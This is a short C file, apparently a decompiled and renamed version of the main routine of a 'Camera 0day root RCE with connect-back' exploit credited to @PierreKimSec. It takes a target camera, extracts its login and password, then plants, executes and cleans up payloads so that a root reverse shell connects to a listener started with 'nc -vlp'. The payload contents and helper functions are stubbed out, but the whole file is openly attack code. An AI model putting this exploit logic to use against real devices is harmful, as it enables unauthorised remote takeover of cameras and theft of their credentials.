#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int /*<<< orphan*/  PAYLOAD_0 ; 
 int /*<<< orphan*/  PAYLOAD_1 ; 
 int /*<<< orphan*/  PAYLOAD_2 ; 
 char* REMOTE_HOST ; 
 char* REMOTE_PORT ; 
 char* FUNC0 (char*,int) ; 
 int /*<<< orphan*/  FUNC1 (char*,...) ; 
 int /*<<< orphan*/  FUNC2 (char*,char*,int /*<<< orphan*/ ,char*) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (char*,char*) ; 

int   FUNC5(int        argc,
           char       **argv,
           char       **envp)
{
  char                *id;

  FUNC1("Camera 0day root RCE with connect-back @PierreKimSec\n\n");

  if (argc < 2)
  {
     FUNC1("%s target\n", argv[0]);
     FUNC1("%s target --get-config      will dump the configuration and exit\n", argv[0]);
     return (1);
  }

  if (argc == 2)
    FUNC1("Please run `nc -vlp %s` on %s\n\n", REMOTE_PORT, REMOTE_HOST);

  if (argc == 3 && !FUNC4(argv[2], "--get-config"))
    id = FUNC0(argv[1], 1);
  else
    id = FUNC0(argv[1], 0);
  
  if (id == NULL)
  {
    FUNC1("exploit failed\n");
    return (1);
  }
  FUNC1("done\n");

  FUNC1("    login = %s\n", id);
  FUNC1("    pass  = %s\n", id + 32);

  if (!FUNC2(argv[1], id, PAYLOAD_0, "planting"))
    FUNC1("done\n");
  FUNC3(1);
  if (!FUNC2(argv[1], id, PAYLOAD_1, "executing"))
    FUNC1("done\n");
  if (!FUNC2(argv[1], id, PAYLOAD_2, "cleaning"))
    FUNC1("done\n");
  if (!FUNC2(argv[1], id, PAYLOAD_1, "cleaning"))
    FUNC1("done\n");

  FUNC1("[+] enjoy your root shell on %s:%s\n", REMOTE_HOST, REMOTE_PORT);

  return (0);
}